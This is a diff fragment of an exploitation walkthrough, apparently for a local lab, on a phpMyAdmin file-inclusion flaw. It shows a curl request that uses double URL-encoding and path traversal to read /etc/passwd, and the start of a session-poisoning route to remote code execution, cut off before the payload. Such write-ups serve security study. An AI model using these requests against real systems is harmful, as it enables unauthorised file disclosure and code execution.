@@ -16,6 +16,7 @@ The vulnerability resides within `index.php`. To handle internal page routing, p
 ## Exploitation Walkthrough
 
 ### 1. Whitelist Bypass via Double URL-Encoding
+
 Verify arbitrary file inclusion by requesting `/etc/passwd`:
 
 ```bash
@@ -25,6 +26,7 @@ curl -s 'http://localhost:8139/index.php?target=db_sql.php%253f/../../../../../.
 The contents of `/etc/passwd` are printed inside the phpMyAdmin HTML wrapper.
 
 ### 2. Session Poisoning to Remote Code Execution
+
 1. Log in to phpMyAdmin with any valid credentials or test database account.
 2. In the SQL query window, run:
    ```sql
